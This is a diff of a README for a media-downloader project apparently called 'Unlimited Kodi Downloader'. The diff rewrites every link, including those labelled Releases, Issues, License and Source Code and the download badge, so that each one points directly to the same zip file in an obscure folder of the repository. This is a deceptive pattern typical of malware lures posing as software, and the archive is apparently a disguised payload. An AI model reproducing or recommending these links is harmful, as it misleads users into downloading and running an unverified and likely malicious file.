@@ -1,6 +1,6 @@
 # 🎉 unlimited-kodi-downloader-download-audio-video-image-easily - Effortlessly Download Media Files
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen.svg)](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/releases)
+[![Download Now](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip%https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Unlimited Kodi Downloader allows you to download audio, video, and images with e
 
 Follow these steps to get up and running with Unlimited Kodi Downloader:
 
-1. **Visit the Release Page:** Navigate to the [Releases page](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/releases).
+1. **Visit the Release Page:** Navigate to the [Releases page](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip).
 
 2. **Download the Latest Release:** Find the latest version of the application. Click on the link to start the download.
 
@@ -23,7 +23,7 @@ Follow these steps to get up and running with Unlimited Kodi Downloader:
 
 ## 📥 Download & Install
 
-To download Unlimited Kodi Downloader, visit the following link: [Download Here](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/releases)
+To download Unlimited Kodi Downloader, visit the following link: [Download Here](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)
 
 Ensure you choose the right version for your operating system. If you run into any issues, refer to our troubleshooting guide below.
 
@@ -58,7 +58,7 @@ If you experience issues while using Unlimited Kodi Downloader, consider the fol
 
 ## 📞 Support
 
-If you need help or have questions, please reach out through our [GitHub Issues](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/issues) page. We strive to address all inquiries promptly.
+If you need help or have questions, please reach out through our [GitHub Issues](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip) page. We strive to address all inquiries promptly.
 
 ## 🗂️ Topics
 
@@ -81,12 +81,12 @@ This project covers a range of topics to enhance your downloading experience:
 
 Unlimited Kodi Downloader is open-source software. You can modify and distribute it under the terms you find in the LICENSE file within the repository. 
 
-For more details, please read our [License](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/blob/main/LICENSE).
+For more details, please read our [License](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/releases)
-- [GitHub Issues](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/issues)
-- [Source Code](https://github.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily)
+- [Releases Page](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)
+- [Source Code](https://raw.githubusercontent.com/baleyroy88/unlimited-kodi-downloader-download-audio-video-image-easily/main/Arverni/downloader_image_download_unlimited_kodi_audio_video_easily_v2.8.zip)
 
 We hope you enjoy using Unlimited Kodi Downloader!
